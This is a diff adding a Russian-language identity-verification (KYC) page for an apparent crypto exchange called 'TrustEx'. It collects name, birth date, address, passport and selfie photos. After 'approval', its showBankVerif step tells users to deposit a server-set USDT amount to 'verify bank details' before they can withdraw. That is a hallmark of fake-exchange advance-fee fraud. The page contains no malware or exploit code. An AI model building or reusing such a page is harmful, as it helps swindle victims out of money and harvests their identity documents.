@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Верификация личности — TrustEx</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script src="js/auth.js?v=3" defer></script>
+<link rel="stylesheet" href="css/nav.css?v=5">
+<script src="js/nav.js?v=7" defer></script>
+<style>
+.content{max-width:560px;margin:0 auto;padding:24px 16px 100px}
+
+/* ── Stepper ── */
+.stepper{display:flex;align-items:center;justify-content:center;gap:0;margin-bottom:8px;padding-top:8px}
+.stepper-item{display:flex;align-items:center}
+.step-circle{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;border:2px solid var(--border);background:var(--card);color:var(--text3);transition:all .3s;flex-shrink:0}
+.step-circle svg{width:16px;height:16px;fill:#fff;display:none}
+.stepper-item.active .step-circle{border-color:var(--yellow);background:var(--yellow);color:#000;box-shadow:0 0 0 4px rgba(240,185,11,.15)}
+.stepper-item.done .step-circle{border-color:var(--green);background:var(--green);color:#fff}
+.stepper-item.done .step-circle .step-num{display:none}
+.stepper-item.done .step-circle svg{display:block}
+.step-line{width:56px;height:2px;background:var(--border);margin:0 6px;border-radius:1px;transition:background .3s}
+.step-line.done{background:var(--green)}
+.stepper-labels{display:flex;justify-content:space-between;padding:8px 12px 0;margin-bottom:20px}
+.step-label{font-size:11px;font-weight:600;color:var(--text3);text-align:center;width:80px;transition:color .3s}
+.step-label.active{color:var(--yellow)}
+.step-label.done{color:var(--green)}
+
+/* ── Panel / Card ── */
+.panel{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:20px;margin-bottom:16px}
+.panel-title{font-size:14px;font-weight:600;color:var(--text2);margin-bottom:16px}
+
+/* ── Info banner ── */
+.info-banner{display:flex;align-items:flex-start;gap:12px;background:rgba(240,185,11,.06);border:1px solid rgba(240,185,11,.15);border-radius:4px;padding:14px 16px;margin-bottom:20px}
+.info-banner svg{width:20px;height:20px;fill:var(--yellow);flex-shrink:0;margin-top:1px}
+.info-banner-text{font-size:13px;color:var(--text2);line-height:1.6}
+.info-banner-text strong{color:var(--text);font-weight:600}
+
+/* ── Form ── */
+.form-group{margin-bottom:16px}
+.form-label{display:block;font-size:13px;font-weight:600;color:var(--text2);margin-bottom:6px}
+.form-input{width:100%;padding:12px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:14px;font-family:inherit;outline:none;transition:border-color .2s}
+.form-input:focus{border-color:var(--yellow)}
+.form-input::placeholder{color:var(--text3)}
+.form-hint{font-size:11px;color:var(--text3);margin-top:4px}
+
+/* ── Photo upload ── */
+.photo-uploads{display:flex;flex-direction:column;gap:12px}
+.photo-card{background:var(--bg2);border:1.5px dashed var(--border);border-radius:4px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.photo-card:hover{border-color:var(--text3)}
+.photo-card.has-photo{border-style:solid;border-color:var(--green)}
+.photo-card input[type="file"]{display:none}
+.upload-row{display:flex;align-items:center;gap:14px;padding:14px 16px}
+.upload-icon{width:44px;height:44px;border-radius:4px;background:var(--card);display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative}
+.upload-icon svg{width:20px;height:20px;fill:var(--text2)}
+.upload-icon .badge-num{position:absolute;top:-4px;right:-4px;width:18px;height:18px;border-radius:50%;background:var(--yellow);color:#000;font-size:10px;font-weight:800;display:flex;align-items:center;justify-content:center}
+.photo-card.has-photo .upload-icon .badge-num{background:var(--green);color:#fff}
+.photo-card.has-photo .upload-icon .badge-num::after{content:'✓';font-size:10px}
+.photo-card.has-photo .upload-icon .badge-num span{display:none}
+.upload-text{flex:1;min-width:0}
+.upload-text .label{font-size:14px;font-weight:600;color:var(--text);margin-bottom:2px}
+.upload-text .sublabel{font-size:11px;color:var(--text3);line-height:1.4}
+.upload-arrow{width:28px;height:28px;border-radius:4px;background:rgba(240,185,11,.1);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.upload-arrow svg{width:14px;height:14px;fill:var(--yellow)}
+.photo-card.has-photo .upload-arrow{background:rgba(14,203,129,.1)}
+.photo-card.has-photo .upload-arrow svg{fill:var(--green)}
+.photo-card .preview{width:100%;height:180px;object-fit:cover;display:none}
+.photo-card.has-photo .preview{display:block}
+.photo-card.has-photo .upload-row{display:none}
+.photo-card .change-hint{display:none;position:absolute;bottom:0;left:0;right:0;padding:8px;background:linear-gradient(transparent,rgba(0,0,0,.8));color:rgba(255,255,255,.9);font-size:12px;font-weight:500;text-align:center}
+.photo-card.has-photo .change-hint{display:block}
+.photo-counter{display:flex;align-items:center;justify-content:center;gap:6px;padding:10px;background:var(--card);border:1px solid var(--border);border-radius:4px;margin-bottom:14px;font-size:12px;color:var(--text3);font-weight:500}
+.photo-counter .count{color:var(--yellow);font-weight:700}
+
+/* ── Buttons ── */
+.btn-primary{width:100%;height:48px;background:var(--yellow);border:none;border-radius:4px;color:#000;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-primary:hover{opacity:.9}
+.btn-primary:disabled{opacity:.4;cursor:not-allowed}
+.btn-secondary{width:100%;padding:12px;background:var(--card);border:1px solid var(--border);border-radius:4px;color:var(--text2);font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;margin-top:10px;transition:all .2s}
+.btn-secondary:hover{border-color:var(--text3);color:var(--text)}
+
+/* ── Steps ── */
+.step-section{display:none;animation:fadeIn .3s ease-out}
+.step-section.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* ── Security note ── */
+.security-note{display:flex;align-items:center;justify-content:center;gap:6px;padding:14px 0 0;font-size:11px;color:var(--text3)}
+.security-note svg{width:12px;height:12px;fill:var(--text3)}
+
+/* ── Success ── */
+.success-screen{text-align:center;padding:40px 16px}
+.success-icon{width:80px;height:80px;margin:0 auto 20px;border-radius:50%;background:rgba(14,203,129,.1);display:flex;align-items:center;justify-content:center;animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(14,203,129,.2)}50%{box-shadow:0 0 0 12px rgba(14,203,129,0)}}
+.success-icon svg{width:36px;height:36px;fill:var(--green)}
+.success-title{font-size:22px;font-weight:700;margin-bottom:10px}
+.success-text{font-size:13px;color:var(--text2);line-height:1.7;margin-bottom:24px}
+.success-detail{display:flex;align-items:center;justify-content:center;gap:8px;padding:12px 16px;background:var(--card);border:1px solid var(--border);border-radius:4px;margin-bottom:20px;font-size:13px;color:var(--text2)}
+.success-detail svg{width:16px;height:16px;fill:var(--yellow)}
+
+/* ── Spinner ── */
+.spinner{width:18px;height:18px;border:2.5px solid transparent;border-top-color:currentColor;border-radius:50%;animation:spin .6s linear infinite;display:inline-block}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<header class="header"></header>
+<nav class="mobnav"></nav>
+
+<div class="content">
+    <!-- Stepper -->
+    <div class="stepper">
+        <div class="stepper-item active" id="si1">
+            <div class="step-circle" id="sc1"><span class="step-num">1</span><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        </div>
+        <div class="step-line" id="sl1"></div>
+        <div class="stepper-item" id="si2">
+            <div class="step-circle" id="sc2"><span class="step-num">2</span><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        </div>
+        <div class="step-line" id="sl2"></div>
+        <div class="stepper-item" id="si3">
+            <div class="step-circle" id="sc3"><span class="step-num">3</span><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        </div>
+    </div>
+    <div class="stepper-labels">
+        <div class="step-label active" id="slbl1">Данные</div>
+        <div class="step-label" id="slbl2">Документы</div>
+        <div class="step-label" id="slbl3">Готово</div>
+    </div>
+
+    <!-- Step 1: Personal Data -->
+    <div class="step-section active" id="step1">
+        <div class="panel">
+            <div class="info-banner">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                <div class="info-banner-text">
+                    <strong>Зачем нужна верификация?</strong><br>
+                    Подтверждение личности защищает ваш аккаунт и открывает полный доступ ко всем функциям платформы, включая вывод средств.
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Фамилия Имя Отчество</label>
+                <input type="text" class="form-input" id="fullName" placeholder="Иванов Иван Иванович" autocomplete="name">
+                <div class="form-hint">Как указано в паспорте</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Дата рождения</label>
+                <input type="date" class="form-input" id="birthDate" max="2010-01-01">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Адрес проживания</label>
+                <input type="text" class="form-input" id="address" placeholder="г. Москва, ул. Примерная, д. 1, кв. 10" autocomplete="street-address">
+                <div class="form-hint">Город, улица, дом, квартира</div>
+            </div>
+
+            <button class="btn-primary" id="btnStep1" onclick="goToStep(2)" disabled>
+                Продолжить
+                <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+            </button>
+        </div>
+
+        <div class="security-note">
+            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            Данные зашифрованы и защищены протоколом TLS
+        </div>
+    </div>
+
+    <!-- Step 2: Photos -->
+    <div class="step-section" id="step2">
+        <div class="panel">
+            <div class="info-banner">
+                <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+                <div class="info-banner-text">
+                    <strong>Требования к фото</strong><br>
+                    Убедитесь, что все данные на документе чётко читаемы. Фото должно быть без бликов и размытий.
+                </div>
+            </div>
+
+            <div class="photo-counter">
+                Загружено: <span class="count" id="photoCount">0</span> из 2 фотографий
+            </div>
+
+            <div class="photo-uploads">
+                <div class="photo-card" id="cardPassport" onclick="document.getElementById('filePassport').click()">
+                    <input type="file" id="filePassport" accept="image/*" onchange="onPhoto(this,'cardPassport','previewPassport','passport')">
+                    <div class="upload-row">
+                        <div class="upload-icon">
+                            <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+                            <div class="badge-num"><span>1</span></div>
+                        </div>
+                        <div class="upload-text">
+                            <div class="label">Паспорт — главная страница</div>
+                            <div class="sublabel">Фото или скан страницы с фотографией</div>
+                        </div>
+                        <div class="upload-arrow"><svg viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4v6zm-4 2h14v2H5v-2z"/></svg></div>
+                    </div>
+                    <img class="preview" id="previewPassport" alt="">
+                    <div class="change-hint">Нажмите, чтобы заменить</div>
+                </div>
+
+                <div class="photo-card" id="cardSelfie" onclick="document.getElementById('fileSelfie').click()">
+                    <input type="file" id="fileSelfie" accept="image/*" onchange="onPhoto(this,'cardSelfie','previewSelfie','selfie')">
+                    <div class="upload-row">
+                        <div class="upload-icon">
+                            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                            <div class="badge-num"><span>2</span></div>
+                        </div>
+                        <div class="upload-text">
+                            <div class="label">Фото лица (селфи)</div>
+                            <div class="sublabel">Без очков, головных уборов, лицо чётко видно</div>
+                        </div>
+                        <div class="upload-arrow"><svg viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4v6zm-4 2h14v2H5v-2z"/></svg></div>
+                    </div>
+                    <img class="preview" id="previewSelfie" alt="">
+                    <div class="change-hint">Нажмите, чтобы заменить</div>
+                </div>
+            </div>
+
+            <button class="btn-primary" id="btnSubmit" onclick="submitKYC()" disabled style="margin-top:16px">
+                Отправить на проверку
+            </button>
+            <button class="btn-secondary" onclick="goToStep(1)">← Назад</button>
+        </div>
+
+        <div class="security-note">
+            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            Фотографии передаются по защищённому каналу
+        </div>
+    </div>
+
+    <!-- Step 3: Success / Status -->
+    <div class="step-section" id="step3">
+        <div class="success-screen" id="successContent">
+            <div class="success-icon">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <div class="success-title">Заявка отправлена!</div>
+            <div class="success-text">
+                Ваши данные и документы отправлены на проверку.<br>
+                Обычно проверка занимает до 30 минут.<br><br>
+                После подтверждения личности вам может потребоваться совершить транзакцию для верификации банковских реквизитов.
+            </div>
+            <div class="success-detail">
+                <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                Среднее время проверки — 30 минут
+            </div>
+            <button class="btn-primary" onclick="location.href='profile.html'">Вернуться в профиль</button>
+        </div>
+    </div>
+</div>
+
+<script>
+var currentStep = 1;
+var photos = { passport: null, selfie: null };
+
+document.addEventListener('DOMContentLoaded', function() {
+    if (!Auth.requireAuth()) return;
+    checkStatus();
+});
+
+async function checkStatus() {
+    try {
+        var res = await Auth.apiFetch('/api/profile');
+        if (!res.ok) return;
+        var d = await res.json();
+        var u = d.data;
+
+        // Already verified
+        if (u.verified) {
+            showVerified(u);
+            return;
+        }
+        // Verification pending — show step 3
+        if (u.verification_pending) {
+            showPending(u);
+            return;
+        }
+        // Rejected
+        if (u.verification_rejected) {
+            showRejected();
+            return;
+        }
+        // Bank verification step
+        if (u.bank_verif_amount > 0) {
+            showBankVerif(u.bank_verif_amount);
+            return;
+        }
+    } catch(e) { console.error(e); }
+}
+
+function showPending(u) {
+    goToStep(3);
+    // Check if bank verif is needed
+    if (u.bank_verif_amount > 0) {
+        showBankVerif(u.bank_verif_amount);
+    }
+}
+
+function showVerified(u) {
+    goToStep(3);
+    var el = document.getElementById('successContent');
+    if (u.bank_verif_amount > 0) {
+        showBankVerif(u.bank_verif_amount);
+        return;
+    }
+    el.innerHTML =
+        '<div class="success-icon" style="background:rgba(14,203,129,.15)">' +
+            '<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="#0ecb81"/></svg>' +
+        '</div>' +
+        '<div class="success-title" style="color:var(--green)">Верификация пройдена!</div>' +
+        '<div class="success-text">Ваша личность успешно подтверждена. Вам доступны все функции платформы, включая вывод средств.</div>' +
+        '<div class="success-detail" style="border-color:rgba(14,203,129,.3);color:var(--green)">' +
+            '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#0ecb81"/></svg>' +
+            'Личность верифицирована' +
+        '</div>' +
+        '<button class="btn-primary" onclick="location.href=\'profile.html\'">Вернуться в профиль</button>';
+}
+
+function showRejected() {
+    goToStep(3);
+    var el = document.getElementById('successContent');
+    el.innerHTML =
+        '<div class="success-icon" style="background:rgba(246,70,93,.1)">' +
+            '<svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#f6465d"/></svg>' +
+        '</div>' +
+        '<div class="success-title" style="color:var(--red)">Верификация не пройдена</div>' +
+        '<div class="success-text">К сожалению, ваша верификация не была одобрена. Обратитесь в службу поддержки для получения подробной информации.</div>' +
+        '<button class="btn-primary" onclick="location.href=\'support.html\'" style="background:var(--red);color:#fff;margin-bottom:10px">Обратиться в поддержку</button>' +
+        '<button class="btn-primary" onclick="location.href=\'profile.html\'">Вернуться в профиль</button>';
+}
+
+function showBankVerif(amount) {
+    goToStep(3);
+    var el = document.getElementById('successContent');
+    el.innerHTML =
+        '<div class="success-icon">' +
+            '<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="#0ecb81"/></svg>' +
+        '</div>' +
+        '<div class="success-title">Личность подтверждена!</div>' +
+        '<div class="success-text">' +
+            'Ваша личность успешно верифицирована! Остался последний этап — подтверждение банковских реквизитов.<br><br>' +
+            'Совершите пополнение на сумму <strong>' + amount + ' USDT</strong>, после чего система автоматически идентифицирует вашу карту.<br><br>' +
+            'Средства будут добавлены к вашему балансу и доступны для вывода после подтверждения реквизитов.' +
+        '</div>' +
+        '<div class="success-detail">' +
+            '<svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14c1.1 0 2 .9 2 2v1h-9a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>' +
+            'Необходимая сумма: <strong>' + amount + ' USDT</strong>' +
+        '</div>' +
+        '<button class="btn-primary" onclick="location.href=\'deposit.html\'">Перейти к пополнению</button>' +
+        '<button class="btn-secondary" onclick="location.href=\'profile.html\'">Вернуться в профиль</button>';
+}
+
+function goToStep(step) {
+    document.getElementById('step' + currentStep).classList.remove('active');
+    document.getElementById('step' + step).classList.add('active');
+    currentStep = step;
+    for (var i = 1; i <= 3; i++) {
+        var item = document.getElementById('si' + i);
+        var lbl = document.getElementById('slbl' + i);
+        item.classList.remove('active', 'done');
+        lbl.classList.remove('active', 'done');
+        if (i < step) { item.classList.add('done'); lbl.classList.add('done'); }
+        else if (i === step) { item.classList.add('active'); lbl.classList.add('active'); }
+    }
+    document.getElementById('sl1').classList.toggle('done', step > 1);
+    document.getElementById('sl2').classList.toggle('done', step > 2);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// Validate step 1
+function validateStep1() {
+    var name = document.getElementById('fullName').value.trim();
+    var date = document.getElementById('birthDate').value;
+    var addr = document.getElementById('address').value.trim();
+    document.getElementById('btnStep1').disabled = !(name && date && addr);
+}
+document.getElementById('fullName').addEventListener('input', validateStep1);
+document.getElementById('birthDate').addEventListener('input', validateStep1);
+document.getElementById('birthDate').addEventListener('change', validateStep1);
+document.getElementById('address').addEventListener('input', validateStep1);
+
+// Photo handling
+function onPhoto(input, cardId, previewId, key) {
+    var file = input.files[0];
+    if (!file) return;
+    if (file.size > 10 * 1024 * 1024) {
+        alert('Максимальный размер файла — 10 МБ');
+        input.value = '';
+        return;
+    }
+    var card = document.getElementById(cardId);
+    var preview = document.getElementById(previewId);
+    var reader = new FileReader();
+    reader.onload = function(e) { preview.src = e.target.result; card.classList.add('has-photo'); };
+    reader.readAsDataURL(file);
+    photos[key] = file;
+    validateStep2();
+}
+
+function validateStep2() {
+    var count = (photos.passport ? 1 : 0) + (photos.selfie ? 1 : 0);
+    document.getElementById('photoCount').textContent = count;
+    document.getElementById('btnSubmit').disabled = count < 2;
+}
+
+// Submit
+async function submitKYC() {
+    var btn = document.getElementById('btnSubmit');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span> Отправка...';
+
+    try {
+        var formData = new FormData();
+        formData.append('fullName', document.getElementById('fullName').value.trim());
+        formData.append('birthDate', document.getElementById('birthDate').value);
+        formData.append('address', document.getElementById('address').value.trim());
+        formData.append('passport', photos.passport);
+        formData.append('selfie', photos.selfie);
+
+        var res = await Auth.apiFetch('/api/profile/kyc/submit', {
+            method: 'POST',
+            body: formData
+        });
+
+        var data = await res.json();
+
+        if (data.success) {
+            goToStep(3);
+        } else {
+            alert(data.error || 'Ошибка отправки');
+            btn.disabled = false;
+            btn.textContent = 'Отправить на проверку';
+        }
+    } catch(e) {
+        alert('Ошибка сети. Попробуйте ещё раз.');
+        btn.disabled = false;
+        btn.textContent = 'Отправить на проверку';
+    }
+}
+</script>
+</body>
+</html>
